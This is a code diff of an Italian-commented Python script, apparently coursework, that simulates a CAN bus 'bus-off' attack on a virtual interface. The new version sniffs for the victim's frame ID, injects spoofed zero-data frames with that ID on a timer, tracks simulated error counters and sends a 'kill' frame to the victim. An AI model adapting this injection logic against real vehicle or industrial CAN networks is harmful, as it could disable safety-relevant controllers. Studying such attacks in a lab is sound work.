@@ -1,97 +1,99 @@
 import can
 import time
-import subprocess
-import re
 
 # --- CONFIGURAZIONE ---
 CAN_INTERFACE = 'vcan0'
 TARGET_ID = 0x123 
-ATTACK_PERIOD_SEC = 5.0 # Deve essere uguale al periodo della Vittima
+KILL_ID = 0x777 
+ATTACK_PERIOD_SEC = 5.0
+BUS_OFF_THRESHOLD = 256
+TEC_PASSIVE_THRESHOLD = 128
+INITIAL_TEC = 0
 # ----------------------
 
-def get_tec_info(interface):
-    """
-    Legge il valore di TEC (Transmit Error Counter) e lo stato del bus dal kernel.
-    """
-    try:
-        command = ['ip', '-details', 'link', 'show', interface]
-        result = subprocess.run(command, capture_output=True, text=True, check=True)
-        output = result.stdout
-        
-        tec_match = re.search(r'tec\s+(\d+)\s+rec\s+(\d+)', output)
-        state_match = re.search(r'state\s+(\S+)', output) 
-
-        tec_value = int(tec_match.group(1)) if tec_match else -1
-        state = state_match.group(1).split('-')[0] if state_match else "UNKNOWN"
-        
-        return tec_value, state
-            
-    except Exception as e:
-        return -2, "ERROR"
-
-def start_attacker():
-    """Simula l'attaccante che inietta messaggi malevoli in sync con la Vittima."""
+def start_attacker_sniffing():
     
     try:
+        # L'Attaccante ha bisogno di una connessione CAN che possa ricevere
         bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
         print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
     except OSError as e:
-        print(f"❌ [Attaccante] Errore di connessione a {CAN_INTERFACE}: {e}")
+        print(f"❌ [Attaccante] Errore di connessione: {e}")
         return
 
+    # --- FASE 1: SINCRONIZZAZIONE (SNIFFING) ---
+    print(f"\n🔍 [Attaccante] FASE 1: In attesa del primo messaggio della Vittima (ID: {hex(TARGET_ID)}) per sincronizzare...")
+    
+    msg = None
+    while msg is None or msg.arbitration_id != TARGET_ID:
+        # Blocca l'esecuzione fino alla ricezione di un messaggio con il TARGET_ID
+        msg = bus.recv(timeout=1.0)
+        if msg is not None and msg.arbitration_id != TARGET_ID:
+             # Ignora messaggi non pertinenti
+             continue
+        if msg is None:
+             # Se scade il timeout senza messaggi, continua ad aspettare
+             print("...sniffing in corso...")
+
+    print(f"✅ [Attaccante] Sincronizzato! Ricevuto il primo messaggio a {time.strftime('%H:%M:%S')}")
+    
+    # --- FASE 2: ATTACCO TEMPORIZZATO ---
+    victim_tec = INITIAL_TEC
+    adversary_tec = INITIAL_TEC
     attack_counter = 0
 
-    print("\n--- ATTACCO BUS-OFF SIMPLIFICATO AVVIATO ---")
-    print(f"Periodo di Attacco (sincronizzato): {ATTACK_PERIOD_SEC} secondi")
-    print("---------------------------------------------")
+    print("\n--- FASE 2: ATTACCO BUS-OFF AVVIATO (Logica Teorica) ---")
+    start_time = time.time() # Iniziamo il timer dopo la sincronizzazione
 
-    while True:
-        # 1. MONITORAGGIO TEC REALE PROPRIO
-        tec_real, status_real = get_tec_info(CAN_INTERFACE)
-
-        print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
-        print(f"🔬 [Attaccante] TEC REALE: {tec_real}. Stato Kernel: {status_real}")
+    while victim_tec < BUS_OFF_THRESHOLD:
         
-        # 2. CONTROLLO BUS OFF PROPRIO
-        if status_real == "BUS": 
-            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si è auto-disattivato.")
+        # 1. Calcolo del TEC simulato (logica delle slide)
+        if victim_tec < TEC_PASSIVE_THRESHOLD:
+            victim_tec_change, adversary_tec_change = 8, 8
+            fase_desc = "Fase 1 (Active)"
+        else:
+            victim_tec_change, adversary_tec_change = 7, -1 
+            fase_desc = "Fase 2 (Passive)"
+        
+        victim_tec += victim_tec_change
+        adversary_tec += adversary_tec_change
+        
+        # 2. Stampa e Controllo Attaccante
+        print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
+        print(f"[{fase_desc}] TEC Sim: V={victim_tec} ({victim_tec_change:+d}), A={adversary_tec} ({adversary_tec_change:+d})")
+
+        if adversary_tec >= BUS_OFF_THRESHOLD:
+            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si auto-disattiva. Interrompo l'attacco.")
             break
         
-        # 3. INIEZIONE DEL MESSAGGIO MALEVOLO
+        # 3. Iniezione del messaggio malevolo
         try:
-            # Il messaggio contiene dati (0x00) che causano l'errore bit/stuffing 
-            # quando la Vittima sta trasmettendo il suo messaggio periodico.
-            msg = can.Message(
+            msg_attack = can.Message(
                 arbitration_id=TARGET_ID,
-                data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
+                data=[0x00] * 8, 
                 is_extended_id=False
             )
-            bus.send(msg)
+            bus.send(msg_attack)
             print(f"💣 [Attaccante] Messaggio malevolo iniettato. Attesa {ATTACK_PERIOD_SEC}s...")
             
-        except can.CanError as e:
-            print(f"⚠️ [Attaccante] Errore durante l'invio: {e}. Interrompo.")
+        except can.CanError:
             break
 
         attack_counter += 1
         time.sleep(ATTACK_PERIOD_SEC) 
 
+    # --- Segnale di Terminazione forzata alla Vittima ---
+    if victim_tec >= BUS_OFF_THRESHOLD:
+        print(f"\n🎉 VITTORIA SIMULATA! Invio segnale di KILL (ID: {hex(KILL_ID)})")
+        try:
+            kill_msg = can.Message(arbitration_id=KILL_ID, data=[0xDE, 0xAD], is_extended_id=False)
+            bus.send(kill_msg)
+            time.sleep(1)
+        except Exception:
+            pass
+        
     bus.shutdown()
     print("\n🛑 [Attaccante] Disconnesso.")
 
 if __name__ == '__main__':
-    # Esegui la stessa funzione di utilità nel contesto dello script per l'Attaccante
-    def get_tec_info(interface):
-        try:
-            command = ['ip', '-details', 'link', 'show', interface]
-            result = subprocess.run(command, capture_output=True, text=True, check=True)
-            output = result.stdout
-            tec_match = re.search(r'tec\s+(\d+)\s+rec\s+(\d+)', output)
-            state_match = re.search(r'state\s+(\S+)', output)
-            tec_value = int(tec_match.group(1)) if tec_match else -1
-            state = state_match.group(1).split('-')[0] if state_match else "UNKNOWN"
-            return tec_value, state
-        except Exception:
-            return -2, "ERROR"
-
-    start_attacker()
+    start_attacker_sniffing()
